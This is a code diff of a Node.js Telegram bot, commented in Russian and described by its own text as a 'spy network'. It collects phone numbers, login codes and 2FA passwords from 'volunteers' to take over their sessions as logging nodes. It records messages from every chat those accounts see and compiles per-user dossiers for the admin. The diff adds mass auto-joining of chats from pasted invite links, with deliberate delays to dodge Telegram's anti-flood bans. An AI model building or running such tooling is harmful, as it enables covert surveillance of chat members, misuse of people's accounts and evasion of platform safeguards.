@@ -1,4 +1,4 @@
-const { TelegramClient } = require('telegram');
+const { TelegramClient, Api } = require('telegram'); // ДОБАВЛЕН Api
 const { StringSession } = require('telegram/sessions');
 const { NewMessage } = require('telegram/events');
 const TelegramBot = require('node-telegram-bot-api');
@@ -8,7 +8,7 @@ const express = require('express');
 const axios = require('axios');
 
 // ====================================================================
-// 🛡️ СИСТЕМА ЖЕЛЕЗОБЕТОННОЙ ЗАЩИТЫ ОТ КРАШЕЙ И ПАДЕНИЙ (АНТИ-КАПРИЗ)
+// 🛡️ СИСТЕМА ЖЕЛЕЗОБЕТОННОЙ ЗАЩИТЫ ОТ КРАШЕЙ И ПАДЕНИЙ
 // ====================================================================
 process.on('uncaughtException', (err) => {
     console.error('🚨 [Критический перехват] Ошибка потока:', err.stack || err.message);
@@ -18,7 +18,9 @@ process.on('unhandledRejection', (reason, promise) => {
     console.error('🚨 [Критический перехват] Необработанный Promise:', reason);
 });
 
-// Глобальные ключи Telegram Desktop
+// Утилита для задержки времени (защита от банов Telegram)
+const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
 const apiId = 2040;
 const apiHash = "b18441a1ff607e10a989891a5462e627";
 
@@ -33,9 +35,10 @@ if (!TELEGRAM_TOKEN) {
 const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
 const authStates = {};
 const activeSpyClients = [];
+let primaryClient = null; // Делаем Главного шпиона глобальным для доступа из других функций
 
 // ====================================================================
-// 📊 ИНИЦИАЛИЗАЦИЯ СУБД SQLITE С РАСШИРЕННЫМИ ТАБЛИЦАМИ СЕТИ И ПРОМО
+// 📊 ИНИЦИАЛИЗАЦИЯ СУБД SQLITE
 // ====================================================================
 const dbPath = path.join(__dirname, 'global_telelog.db');
 const db = new sqlite3.Database(dbPath);
@@ -55,23 +58,16 @@ db.serialize(() => {
         user_id TEXT PRIMARY KEY, phone TEXT, session_string TEXT, added_at TEXT
     )`);
 
-    // 🔥 ТАБЛИЦА ПРОМОКОДОВ
     db.run(`CREATE TABLE IF NOT EXISTS promo_codes (
-        code TEXT PRIMARY KEY,
-        max_uses INTEGER,
-        current_uses INTEGER DEFAULT 0,
-        created_at TEXT
+        code TEXT PRIMARY KEY, max_uses INTEGER, current_uses INTEGER DEFAULT 0, created_at TEXT
     )`);
 
-    // 🔥 ТАБЛИЦА ПРОФИЛЕЙ И БАЛАНСА ЮЗЕРОВ
     db.run(`CREATE TABLE IF NOT EXISTS user_profiles (
-        user_id TEXT PRIMARY KEY,
-        balance INTEGER DEFAULT 0,
-        used_promos TEXT DEFAULT ''
+        user_id TEXT PRIMARY KEY, balance INTEGER DEFAULT 0, used_promos TEXT DEFAULT ''
     )`);
 });
 
-// Универсальный обработчик входящих сообщений для ЛЮБОГО юзербота
+// Универсальный обработчик логов
 async function registerSpyHandlers(client, accountName) {
     client.addEventHandler(async (event) => {
         const message = event.message;
@@ -110,7 +106,6 @@ async function registerSpyHandlers(client, accountName) {
                 VALUES (?, ?, 1) ON CONFLICT(chat_id) DO UPDATE SET
                     chat_title = excluded.chat_title, total_captured = total_captured + 1
                 `, [chatId, chatTitle]);
-
         } catch (e) {}
     }, new NewMessage({}));
 }
@@ -119,7 +114,7 @@ async function registerSpyHandlers(client, accountName) {
 async function initAllSpyNodes() {
     if (process.env.TELEGRAM_SESSION) {
         const primarySession = new StringSession(process.env.TELEGRAM_SESSION);
-        const primaryClient = new TelegramClient(primarySession, apiId, apiHash, { connectionRetries: 5, useWSS: true });
+        primaryClient = new TelegramClient(primarySession, apiId, apiHash, { connectionRetries: 5, useWSS: true });
         try {
             await primaryClient.connect();
             const me = await primaryClient.getMe();
@@ -146,16 +141,13 @@ async function initAllSpyNodes() {
 }
 
 // ====================================================================
-// 🧠 ДИНАМИЧЕСКИЕ МЕНЮ (РАЗДЕЛЕНИЕ НА ЮЗЕРА И АДМИНА + ПРОМО)
+// 🧠 ДИНАМИЧЕСКИЕ МЕНЮ
 // ====================================================================
 function getMenuText(userId) {
     if (userId.toString() === ADMIN_ID) {
-        return "⚡️ *АДМИН-ПАНЕЛЬ СЕТИ ШПИОНАЖА* ⚡️\n\n" +
-               "Братан, тебе доступны скрытые функции управления промокодами и модули тотальной аналитики.";
+        return "⚡️ *АДМИН-ПАНЕЛЬ СЕТИ ШПИОНАЖА* ⚡️\n\nБратан, тебе доступны скрытые функции.";
     }
-    return "⚡️ *ИНФОРМАЦИОННО-АНАЛИТИЧЕСКИЙ БОТ | ФАНСТАТ* ⚡️\n\n" +
-           "Привет! Я собираю статистику активности в Telegram чатах.\n\n" +
-           "📊 *Поиск чата:* Введи название чата или его юзернейм, чтобы узнать объем перехваченных логов.";
+    return "⚡️ *ИНФОРМАЦИОННО-АНАЛИТИЧЕСКИЙ БОТ | ФАНСТАТ* ⚡️\n\n📊 *Поиск чата:* Введи название чата или его юзернейм.";
 }
 
 function getMenuButtons(userId) {
@@ -163,12 +155,15 @@ function getMenuButtons(userId) {
         return {
             inline_keyboard: [
                 [
-                    { text: '🏆 Топ-10 Флудеров', callback_data: 'global_top' },
-                    { text: '🏰 Мониторинг чатов', callback_data: 'chats_status' }
+                    { text: '🏆 Топ-10', callback_data: 'global_top' },
+                    { text: '🏰 База чатов', callback_data: 'chats_status' }
                 ],
                 [
-                    { text: '🎟 Создать промокод', callback_data: 'create_promo_mode' },
+                    { text: '🎟 Промокоды', callback_data: 'create_promo_mode' },
                     { text: '🌐 Статус Сети', callback_data: 'network_status' }
+                ],
+                [
+                    { text: '➕ Авто-вступление в чаты', callback_data: 'auto_join_mode' }
                 ],
                 [
                     { text: '⚙️ На главную', callback_data: 'to_main' }
@@ -190,33 +185,31 @@ function getMenuButtons(userId) {
     };
 }
 
-// Поиск чата для юзеров
 function searchChatInDb(searchText, callback) {
     db.all(`SELECT * FROM spy_chats WHERE LOWER(chat_title) LIKE LOWER(?)`, [`%${searchText}%`], (err, rows) => {
         if (err || !rows || rows.length === 0) {
-            return callback(`❌ *Чат не найден в системе.*\n\nНаши шпионы пока не зафиксировали активность в чатах с похожим названием.`);
+            return callback(`❌ *Чат не найден в системе.*`);
         }
         let response = `🏰 *РЕЗУЛЬТАТЫ ПОИСКА ПО ЧАТАМ* 🏰\n\n`;
         rows.forEach((row, index) => {
-            response += `${index + 1}. *${row.chat_title}*\n   └ 📊 Считано сообщений сети: *${row.total_captured}*\n\n`;
+            response += `${index + 1}. *${row.chat_title}*\n   └ 📊 Считано: *${row.total_captured}*\n\n`;
         });
         callback(response);
     });
 }
 
-// Поиск Юзера для админки/профиля
 function searchUser(param, isUsername, callback) {
     let querySQL = isUsername ? `SELECT * FROM global_logs WHERE LOWER(username) = LOWER(?)` : `SELECT * FROM global_logs WHERE user_id = ?`;
     db.all(querySQL, [param], (err, rows) => {
-        if (err || !rows || rows.length === 0) return callback(`❌ *Объект не найден в базе данных логов.*`);
-        let totalMsg = 0, totalStickers = 0, chatsList = '';
-        rows.forEach(row => { totalMsg += row.msg_count; totalStickers += row.sticker_count; chatsList += `• *${row.chat_title}*: 💬 *${row.msg_count}*\n`; });
+        if (err || !rows || rows.length === 0) return callback(`❌ *Объект не найден.*`);
+        let chatsList = '';
+        rows.forEach(row => { chatsList += `• *${row.chat_title}*: 💬 *${row.msg_count}*\n`; });
         callback(`👤 *ДОСЬЕ ПОЛЬЗОВАТЕЛЯ* 👤\n\n• *Имя:* ${rows[0].first_name}\n• *Ник:* ${rows[0].username}\n• *ID:* \`${rows[0].user_id}\`\n\n🏰 *Замечен в чатах:*\n${chatsList}`);
     });
 }
 
 // ====================================================================
-// 📥 ОБРАБОТЧИК ВХОДЯЩИХ ТЕКСТОВЫХ СООБЩЕНИЙ
+// 📥 ОБРАБОТЧИК ВХОДЯЩИХ СООБЩЕНИЙ
 // ====================================================================
 bot.on('message', async (msg) => {
     if (msg.chat.type !== 'private') return;
@@ -226,87 +219,114 @@ bot.on('message', async (msg) => {
 
     if (text === '/start') {
         delete authStates[chatId];
-        // Гарантируем, что запись о профиле юзера есть в БД
         db.run(`INSERT OR IGNORE INTO user_profiles (user_id) VALUES (?)`, [chatId.toString()]);
         return bot.sendMessage(chatId, getMenuText(chatId), { parse_mode: 'Markdown', reply_markup: getMenuButtons(chatId) });
     }
 
-    // 🔥 АДМИН: Создание промокода (обработка ввода)
-    if (state && state.step === 'WAITING_PROMO_CREATION' && chatId.toString() === ADMIN_ID) {
-        if (!text.includes(':')) {
-            return bot.sendMessage(chatId, "⚠️ *Ошибка формата.* Пришли код строго в виде `ПРОМО:КОЛИЧЕСТВО`. Пример: `VIP777:10` \nПопробуй заново:");
+    // 🔥 АДМИН: Авто-вступление в списки чатов
+    if (state && state.step === 'WAITING_CHATS_LIST' && chatId.toString() === ADMIN_ID) {
+        if (!primaryClient) return bot.sendMessage(chatId, "❌ Главный шпион (сессия) не подключен!", { reply_markup: getMenuButtons(chatId) });
+
+        // Регулярка вытягивает все ссылки t.me/ и @username из текста
+        const links = text.match(/(?:@|t\.me\/|https:\/\/t\.me\/)[A-Za-z0-9_+-]+/g);
+        
+        if (!links || links.length === 0) {
+            return bot.sendMessage(chatId, "⚠️ Не нашел корректных ссылок. Попробуй еще раз или жми Назад.");
         }
+
+        delete authStates[chatId];
+        bot.sendMessage(chatId, `⏳ *Старт операции внедрения.*\n\nОбнаружено чатов: *${links.length}*\nГлавный шпион начинает вступление. Задержка между чатами — 15 секунд (защита от бана). Жди отчет!`, { parse_mode: 'Markdown' });
+
+        let successCount = 0;
+
+        for (let i = 0; i < links.length; i++) {
+            let target = links[i].replace('https://t.me/', '').replace('t.me/', '');
+            
+            try {
+                if (target.startsWith('+') || target.startsWith('joinchat/')) {
+                    // Обработка приватной ссылки-приглашения
+                    const hash = target.replace('joinchat/', '').replace('+', '');
+                    await primaryClient.invoke(new Api.messages.ImportChatInviteRequest({ hash }));
+                } else {
+                    // Обработка публичного юзернейма
+                    if (!target.startsWith('@')) target = '@' + target;
+                    await primaryClient.invoke(new Api.channels.JoinChannelRequest({ channel: target }));
+                }
+                successCount++;
+                
+                // Делаем паузу перед следующим, если это не последний чат
+                if (i < links.length - 1) await sleep(15000); 
+
+            } catch (err) {
+                console.error(`Ошибка при вступлении в ${target}:`, err.message);
+                // Если словили лимит от Телеги
+                if (err.message.includes('FLOOD')) {
+                    bot.sendMessage(chatId, `🚨 *АХТУНГ: FLOOD WAIT!* Telegram временно заблокировал вступления. Операция прервана на ${target}.`, { parse_mode: 'Markdown' });
+                    break;
+                }
+                // Игнорируем другие ошибки (например, юзернейм занят ботом, а не чатом) и идем дальше
+            }
+        }
+
+        return bot.sendMessage(chatId, `✅ *Внедрение завершено!*\n\nУспешно вступлено в *${successCount}* из ${links.length} чатов. Можешь проверять аккаунт.`, { parse_mode: 'Markdown', reply_markup: getMenuButtons(chatId) });
+    }
+
+    // 🔥 АДМИН: Создание промокода
+    if (state && state.step === 'WAITING_PROMO_CREATION' && chatId.toString() === ADMIN_ID) {
+        if (!text.includes(':')) return bot.sendMessage(chatId, "⚠️ Формат: `ПРОМО:КОЛ-ВО`");
         const [promoCode, rawMaxUses] = text.split(':');
         const maxUses = parseInt(rawMaxUses, 10);
-
-        if (isNaN(maxUses) || maxUses <= 0) {
-            return bot.sendMessage(chatId, "❌ Количество использований должно быть числом больше 0. Попробуй заново:");
-        }
+        if (isNaN(maxUses) || maxUses <= 0) return bot.sendMessage(chatId, "❌ Ошибка в числе.");
 
         const now = new Date().toLocaleString('ru-RU');
         db.run(`INSERT INTO promo_codes (code, max_uses, current_uses, created_at) VALUES (?, ?, 0, ?)
                 ON CONFLICT(code) DO UPDATE SET max_uses = excluded.max_uses, current_uses = 0`, 
-                [promoCode.toUpperCase(), maxUses, now], (err) => {
-            if (err) return bot.sendMessage(chatId, "❌ Ошибка БД при создании промо.");
+                [promoCode.toUpperCase(), maxUses, now], () => {
             delete authStates[chatId];
-            return bot.sendMessage(chatId, `🎉 *ПРОМОКОД УСПЕШНО СОЗДАН!* 🎉\n\n• Код: *${promoCode.toUpperCase()}*\n• Доступно активаций: *${maxUses}*\n\nМожешь раздавать его пользователям!`, { parse_mode: 'Markdown', reply_markup: getMenuButtons(chatId) });
+            return bot.sendMessage(chatId, `🎉 *ПРОМОКОД УСПЕШНО СОЗДАН!*`, { parse_mode: 'Markdown', reply_markup: getMenuButtons(chatId) });
         });
         return;
     }
 
-    // 👤 ЮЗЕР: Ввод промокода (обработка ввода)
+    // 👤 ЮЗЕР: Ввод промокода
     if (state && state.step === 'WAITING_PROMO_INPUT') {
         const inputCode = text.toUpperCase();
-
         db.get(`SELECT * FROM promo_codes WHERE code = ?`, [inputCode], (err, promo) => {
-            if (err || !promo) {
-                return bot.sendMessage(chatId, "❌ *Такого промокода не существует.* Проверь буквы и введи заново:", { reply_markup: getMenuButtons(chatId) });
-            }
+            if (err || !promo) return bot.sendMessage(chatId, "❌ *Такого промокода не существует.*", { reply_markup: getMenuButtons(chatId), parse_mode: 'Markdown' });
+            if (promo.current_uses >= promo.max_uses) return bot.sendMessage(chatId, "🔴 *Увы, лимит этого промокода исчерпан!*", { reply_markup: getMenuButtons(chatId), parse_mode: 'Markdown' });
 
-            if (promo.current_uses >= promo.max_uses) {
-                return bot.sendMessage(chatId, "🔴 *Увы, лимит этого промокода исчерпан!* Больше его активировать нельзя.", { reply_markup: getMenuButtons(chatId) });
-            }
-
-            // Проверяем, вводил ли этот юзер этот код ранее
             db.get(`SELECT * FROM user_profiles WHERE user_id = ?`, [chatId.toString()], (err, profile) => {
                 const usedPromos = profile && profile.used_promos ? profile.used_promos.split(',') : [];
-                
                 if (usedPromos.includes(inputCode)) {
                     delete authStates[chatId];
-                    return bot.sendMessage(chatId, "⚠️ *Ты уже активировал этот промокод ранее!* Повторно нельзя.", { reply_markup: getMenuButtons(chatId) });
+                    return bot.sendMessage(chatId, "⚠️ *Ты уже активировал этот промокод!*", { reply_markup: getMenuButtons(chatId), parse_mode: 'Markdown' });
                 }
 
-                // Всё ок — активируем! Увеличиваем счётчик использований в промокоде
                 db.run(`UPDATE promo_codes SET current_uses = current_uses + 1 WHERE code = ?`, [inputCode]);
-                
-                // Добавляем промокод в список использованных юзером и начисляем бонусные очки (например, 100 баллов)
                 usedPromos.push(inputCode);
                 const updatedPromosString = usedPromos.join(',');
-                
                 db.run(`INSERT INTO user_profiles (user_id, balance, used_promos) VALUES (?, 100, ?)
                         ON CONFLICT(user_id) DO UPDATE SET balance = balance + 100, used_promos = ?`, 
-                        [chatId.toString(), updatedPromosString, updatedPromosString], (err) => {
-                    
+                        [chatId.toString(), updatedPromosString, updatedPromosString], () => {
                     delete authStates[chatId];
-                    return bot.sendMessage(chatId, `🔥 *ПРОМОКОД УСПЕШНО АКТИВИРОВАН!* 🔥\n\nТебе начислено *100 Бонусных Кредитов* на баланс профиля! Спасибо, что ты с нами.`, { parse_mode: 'Markdown', reply_markup: getMenuButtons(chatId) });
+                    return bot.sendMessage(chatId, `🔥 *ПРОМОКОД АКТИВИРОВАН!* Начислено 100 кредитов.`, { parse_mode: 'Markdown', reply_markup: getMenuButtons(chatId) });
                 });
             });
         });
         return;
     }
 
-    // Обычные этапы авторизации юзерботов (телефон -> код -> 2FA)
+    // Этапы авторизации юзерботов
     if (state && state.step === 'WAITING_PHONE') {
         const phone = text.replace(/\s+/g, '');
-        if (!phone.startsWith('+')) return bot.sendMessage(chatId, "❌ Телефон должен начинаться с `+`.");
-        bot.sendMessage(chatId, "⏳ Связываюсь с серверами Telegram...");
+        bot.sendMessage(chatId, "⏳ Высылаю код...");
         const tempClient = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 3, useWSS: true });
         try {
             await tempClient.connect();
             const phoneCodeHash = await tempClient.sendCode({ apiId, apiHash }, phone);
             authStates[chatId] = { step: 'WAITING_CODE', phone: phone, phoneCodeHash: phoneCodeHash.phoneCodeHash, client: tempClient };
-            return bot.sendMessage(chatId, `📬 Код отправлен на номер *${phone}*. Введи его:`);
-        } catch (err) { return bot.sendMessage(chatId, `❌ Ошибка: \`${err.message}\`. Повтори:`); }
+            return bot.sendMessage(chatId, `📬 Код отправлен на номер *${phone}*. Введи его:`, { parse_mode: 'Markdown' });
+        } catch (err) { return bot.sendMessage(chatId, `❌ Ошибка: \`${err.message}\``, { parse_mode: 'Markdown' }); }
     }
 
     if (state && state.step === 'WAITING_CODE') {
@@ -317,7 +337,7 @@ bot.on('message', async (msg) => {
             activeSpyClients.push(state.client);
             await registerSpyHandlers(state.client, `Узел (@${me.username})`);
             delete authStates[chatId];
-            return bot.sendMessage(chatId, `🎉 *Аккаунт успешно подключен!*`, { reply_markup: getMenuButtons(chatId) }); // Добавили кнопки сюда
+            return bot.sendMessage(chatId, `🎉 *Узел подключен!*`, { parse_mode: 'Markdown', reply_markup: getMenuButtons(chatId) });
         } catch (err) {
             if (err.message.includes("SESSION_PASSWORD_NEEDED")) {
                 authStates[chatId].step = 'WAITING_PASSWORD';
@@ -335,33 +355,24 @@ bot.on('message', async (msg) => {
             activeSpyClients.push(state.client);
             await registerSpyHandlers(state.client, `Узел (@${me.username})`);
             delete authStates[chatId];
-            return bot.sendMessage(chatId, `🎉 *Аккаунт с 2FA успешно подключен!*`, { reply_markup: getMenuButtons(chatId) }); // Добавили кнопки сюда
+            return bot.sendMessage(chatId, `🎉 *Узел подключен!*`, { parse_mode: 'Markdown', reply_markup: getMenuButtons(chatId) });
         } catch (err) { return bot.sendMessage(chatId, `❌ Пароль неверный.`); }
     }
 
-    // ==========================================
-    // 🔥 РОУТИНГ ПОИСКА (ГЛАВНОЕ ИЗМЕНЕНИЕ)
-    // ==========================================
+    // Роутинг поиска
     if (chatId.toString() === ADMIN_ID) {
         let param = text; let isUsername = false;
         if (msg.forward_from) param = msg.forward_from.id.toString();
         else if (text.startsWith('@')) isUsername = true;
-        else if (!/^\d+$/.test(text)) return bot.sendMessage(chatId, "⚠️ Админ, вбивай `@username` юзера или ID.", { reply_markup: getMenuButtons(chatId) }); // Кнопки при ошибке
-
-        searchUser(param, isUsername, (res) => {
-            // Вместо одиночной кнопки "Назад" выдаем полное меню getMenuButtons
-            bot.sendMessage(chatId, res, { parse_mode: 'Markdown', reply_markup: getMenuButtons(chatId) });
-        });
+        else if (!/^\d+$/.test(text)) return bot.sendMessage(chatId, "⚠️ Вбивай `@username` или ID.", { reply_markup: getMenuButtons(chatId) });
+        searchUser(param, isUsername, (res) => bot.sendMessage(chatId, res, { parse_mode: 'Markdown', reply_markup: getMenuButtons(chatId) }));
     } else {
-        searchChatInDb(text, (res) => {
-            // Вместо одиночной кнопки "Назад" выдаем полное меню getMenuButtons
-            bot.sendMessage(chatId, res, { parse_mode: 'Markdown', reply_markup: getMenuButtons(chatId) });
-        });
+        searchChatInDb(text, (res) => bot.sendMessage(chatId, res, { parse_mode: 'Markdown', reply_markup: getMenuButtons(chatId) }));
     }
 });
 
 // ====================================================================
-// 🎛️ СИСТЕМА НАЖАТИЙ (ОБРАБОТКА ОБНОВЛЕНИЙ ИНЛАЙН И ПРОМОКНОПОК)
+// 🎛️ СИСТЕМА НАЖАТИЙ 
 // ====================================================================
 bot.on('callback_query', (query) => {
     const chatId = query.message.chat.id;
@@ -374,16 +385,22 @@ bot.on('callback_query', (query) => {
     }
 
     // ⛔️ АДМИН-КНОПКИ
+    else if (data === 'auto_join_mode') {
+        if (chatId.toString() !== ADMIN_ID) return bot.answerCallbackQuery(query.id, { text: "🔒 Заблокировано!", show_alert: true });
+        authStates[chatId] = { step: 'WAITING_CHATS_LIST' };
+        bot.editMessageText("➕ *МАССОВОЕ ВНЕДРЕНИЕ В ЧАТЫ*\n\nОтправь мне список ссылок на чаты (публичные `@username` или приватные `t.me/+hash`). Можно просто скопировать пачку текста с ссылками, я сам их найду.\n\n_Шпион будет вступать в них автоматически с задержкой._", { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '❌ Отмена', callback_data: 'to_main' }]] } }).catch(() => {});
+    }
+
     else if (data === 'create_promo_mode') {
         if (chatId.toString() !== ADMIN_ID) return bot.answerCallbackQuery(query.id, { text: "🔒 Заблокировано!", show_alert: true });
         authStates[chatId] = { step: 'WAITING_PROMO_CREATION' };
-        bot.editMessageText("🎟 *РЕЖИМ СОЗДАНИЯ ПРОМОКОДА*\n\nПришли строку в формате `ПРОМО:КОЛИЧЕСТВО_АКТИВАЦИЙ`.\n\n*Пример:* `WANTED:5` (Промокод WANTED на 5 юзеров):", { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '❌ Отмена', callback_data: 'to_main' }]] } }).catch(() => {});
+        bot.editMessageText("🎟 *РЕЖИМ СОЗДАНИЯ ПРОМОКОДА*\n\nПришли строку в формате `ПРОМО:КОЛИЧЕСТВО_АКТИВАЦИЙ`.", { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '❌ Отмена', callback_data: 'to_main' }]] } }).catch(() => {});
     }
 
     else if (data === 'global_top') {
         if (chatId.toString() !== ADMIN_ID) return bot.answerCallbackQuery(query.id, { text: "🔒 Заблокировано!", show_alert: true });
         db.all(`SELECT username, first_name, SUM(msg_count) as total FROM global_logs GROUP BY user_id ORDER BY total DESC LIMIT 10`, [], (err, rows) => {
-            let topText = "🏆 *ТОП-10 САМЫХ АКТИВНЫХ ПОЛЬЗОВАТЕЛЕЙ СЕТИ* 🏆\n\n";
+            let topText = "🏆 *ТОП-10 ФЛУДЕРОВ* 🏆\n\n";
             if (err || !rows || rows.length === 0) topText += "_База пуста._";
             else rows.forEach((row, index) => { topText += `${index + 1}. *${row.first_name}* (${row.username}) — 💬 *${row.total}*\n`; });
             bot.editMessageText(topText, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '⬅️ В админку', callback_data: 'to_main' }]] } }).catch(() => {});
@@ -401,10 +418,9 @@ bot.on('callback_query', (query) => {
     }
 
     else if (data === 'network_status') {
-        if (chatId.toString() !== ADMIN_ID) return bot.answerCallbackQuery(query.id, { text: "🔒 Доступ заблокирован!", show_alert: true });
+        if (chatId.toString() !== ADMIN_ID) return bot.answerCallbackQuery(query.id, { text: "🔒 Заблокировано!", show_alert: true });
         db.get(`SELECT COUNT(*) as count FROM spy_nodes`, [], (err, row) => {
-            const nodesCount = row ? row.count : 0;
-            const netStatus = `🌐 *МОНИТОРИНГ СЕТИ ШПИОНАЖА*\n\n• Активно узлов онлайн: *${activeSpyClients.length}*\n• Сдано добровольцами: *${nodesCount}*`;
+            const netStatus = `🌐 *МОНИТОРИНГ СЕТИ*\n\n• Активно узлов онлайн: *${activeSpyClients.length}*\n• Узлов в базе: *${row ? row.count : 0}*`;
             bot.editMessageText(netStatus, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '⬅️ В админку', callback_data: 'to_main' }]] } }).catch(() => {});
         });
     }
@@ -412,29 +428,20 @@ bot.on('callback_query', (query) => {
     // 🔓 КНОПКИ ДЛЯ ЮЗЕРОВ
     else if (data === 'enter_promo_mode') {
         authStates[chatId] = { step: 'WAITING_PROMO_INPUT' };
-        bot.editMessageText("🎟 *АКТИВАЦИЯ БОНУСНОГО ПРОМОКОДА*\n\nВведите ваш секретный промокод для зачисления кредитов лояльности на ваш баланс:", { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '❌ Отмена', callback_data: 'to_main' }]] } }).catch(() => {});
+        bot.editMessageText("🎟 *АКТИВАЦИЯ ПРОМОКОДА*\n\nВведи код:", { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '❌ Отмена', callback_data: 'to_main' }]] } }).catch(() => {});
     }
-
     else if (data === 'join_network') {
         authStates[chatId] = { step: 'WAITING_PHONE' };
-        bot.editMessageText("🤝 *РЕЖИМ ДОБРОВОЛЬЦА СЕТИ*\n\nВведи телефон в формате `+79991234567`:", { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '❌ Отмена', callback_data: 'to_main' }]] } }).catch(() => {});
+        bot.editMessageText("🤝 *РЕЖИМ ДОБРОВОЛЬЦА*\n\nВведи телефон `+79991234567`:", { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '❌ Отмена', callback_data: 'to_main' }]] } }).catch(() => {});
     }
-
     else if (data === 'my_profile') {
         db.get(`SELECT * FROM user_profiles WHERE user_id = ?`, [chatId.toString()], (err, row) => {
-            const balance = row ? row.balance : 0;
-            const profileText = `👤 *ТВОЙ ЛИЧНЫЙ ПРОФИЛЬ* 👤\n\n` +
-                                `• Твой Telegram ID: \`${chatId}\`\n` +
-                                `• Бонусный баланс: *${balance}* Кредитов\n\n` +
-                                `💡 Пополнять баланс можно с помощью секретных промокодов от Администрации.`;
-            bot.editMessageText(profileText, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '⬅️ Назад', callback_data: 'to_main' }]] } }).catch(() => {});
+            bot.editMessageText(`👤 *ПРОФИЛЬ*\n\n• ID: \`${chatId}\`\n• Кредиты: *${row ? row.balance : 0}*`, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '⬅️ Назад', callback_data: 'to_main' }]] } }).catch(() => {});
         });
     }
-
     else if (data === 'bot_info') {
-        bot.editMessageText("📖 *СПРАВКА ДЛЯ ПОЛЬЗОВАТЕЛЕЙ*\n\nПросто отправь мне название или юзернейм любого чата, чтобы узнать, сколько логов активности в нём зафиксировано нашей сетью.", { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '⬅️ Назад', callback_data: 'to_main' }]] } }).catch(() => {});
+        bot.editMessageText("📖 *СПРАВКА*\n\nОтправь название чата для поиска логов.", { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '⬅️ Назад', callback_data: 'to_main' }]] } }).catch(() => {});
     }
-
     try { bot.answerCallbackQuery(query.id); } catch(e) {}
 });
 
